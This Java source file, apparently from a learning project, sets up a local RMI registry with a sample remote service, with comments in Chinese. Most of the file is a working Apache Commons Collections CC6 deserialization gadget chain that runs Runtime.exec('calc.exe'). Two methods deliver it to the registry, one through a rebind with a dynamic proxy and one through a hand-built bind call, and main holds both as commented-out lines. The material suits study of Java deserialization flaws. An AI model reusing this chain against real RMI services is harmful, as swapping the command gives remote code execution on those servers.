package com.endlessshw.rmi.server;

import com.endlessshw.rmi.common.IMyRemote;
import com.endlessshw.rmi.common.Impl.MyRemoteImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import sun.rmi.registry.RegistryImpl_Stub;
import sun.rmi.server.UnicastRef;

import java.io.ObjectOutput;
import java.lang.reflect.*;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.Operation;
import java.rmi.server.RemoteCall;
import java.rmi.server.RemoteObject;
import java.util.HashMap;
import java.util.Map;

/**
 * @author hasee
 * @version 1.0
 * @description: 服务器，提供自定义类的 RMI 服务
 * @date 2023/5/3 11:51
 */
public class MyRemoteServer {
    public static void main(String[] args) throws Exception {
        // 实例化自定义类R
        IMyRemote myRemote = new MyRemoteImpl();

        // 通过 UnicastRemoteObject 将服务导出为远程服务接口，前提是远程接口没有继承 UnicastRemoteObject
        // IMyRemote myExportedRemote = (IMyRemote) UnicastRemoteObject.exportObject(myRemote, 0);

        // 通过注册中心，将 RMI 服务注册到 1099 端口
        // 远程拿到注册对象，这里为了演示方便，就先创建再远程获取
        LocateRegistry.createRegistry(1099);
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        // 如果注册中心和服务端在一起，上面的方法就要注释掉，改用下面的方法
        // Registry registry = LocateRegistry.createRegistry(1099);
        // 注册，并将服务命名为 myRemote
        registry.rebind("myRemote", myRemote);


        // rebindAttack 攻击注册中心
        // registry.rebind("myRemote", rebindAttack());

        // rebindAttack2 重写 rebind 攻击注册中心
        // myBind(registry);
    }

    private static Remote rebindAttack() throws Exception{
        HashMap toBeSerializedHashMap = getCC6();
        // 上面的部分是 CC6 链主体部分，由于 rebind 的对象要继承 Remote，因此还需要使用动态代理
        Class<?> aIHClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> aIHClassDeclaredConstructor = aIHClass.getDeclaredConstructor(Class.class, Map.class);
        aIHClassDeclaredConstructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) aIHClassDeclaredConstructor.newInstance(Override.class, toBeSerializedHashMap);
        return (Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Remote.class}, invocationHandler);
    }

    /**
     * 模拟 RMI RegistryImpl_Stub 的 bind，手动对 Registry 发起请求
     * @param registry
     */
    private static void myBind(Registry registry) {
        // 拿到 RegistryImpl_Stub 的 UnicastRef
        UnicastRef unicastRef = (UnicastRef) ((RegistryImpl_Stub) registry).getRef();
        // 模仿
        Operation[] operations = new Operation[]{new Operation("void bind(java.lang.String, java.rmi.Remote)"),
                new Operation("java.lang.String list()[]"),
                new Operation("java.rmi.Remote lookup(java.lang.String)"),
                new Operation("void rebind(java.lang.String, java.rmi.Remote)"),
                new Operation("void unbind(java.lang.String)")};
        try {
            RemoteCall call = unicastRef.newCall((RemoteObject) registry, operations, 0, 4905912898345647071L);
            ObjectOutput out = call.getOutputStream();
            out.writeObject("test");
            out.writeObject(getCC6());
            unicastRef.invoke(call);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }

    }

    private static HashMap getCC6() throws Exception{
        // 1. 构造链 sink
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
        };
        ChainedTransformer transformedChain = new ChainedTransformer(transformers);
        // 2. kick-off 创建 HashMap
        HashMap<Object, Object> toBeSerializedHashMap = new HashMap<>();
        // 3. 构建 chain2，创建 LazyMap，先不传链的后半部分，让链断开，这样 put 时调用 HashMap.hashCode() 时不会触发链
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap<>(), new ChainedTransformer(new Transformer[]{}));
        // 4. 然后构建 chain1，创建 TiedMapEntry，注意这里，它最终会调用到 LazyMap.get("EndlessShw")，由于 LazyMap 中没有键为 EndlessShw，所以会向里面塞一个 key 为 EndlessShw
        // 在 CC1 中提到，LazyMap `get()` 获取不到 key 时，从而调用 `transform()`，因此要清除掉他的 Key
        TiedMapEntry lazyMapTiedMapEntry = new TiedMapEntry(lazyMap, "EndlessShw");
        // 5. 将 kick-off 和 chain 相连
        toBeSerializedHashMap.put(lazyMapTiedMapEntry, "随便");
        // 6. 把 lazyMap 中塞入的 key 给去掉
        lazyMap.remove("EndlessShw");
        // 当然也可以使用 clear
        // lazyMap.clear();
        // 7. 通过反射获取 LazyMap 的值，put 后改回来，最终让其在反序列化时触发
        Field factoryField = lazyMap.getClass().getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap, transformedChain);
        return toBeSerializedHashMap;
    }
}
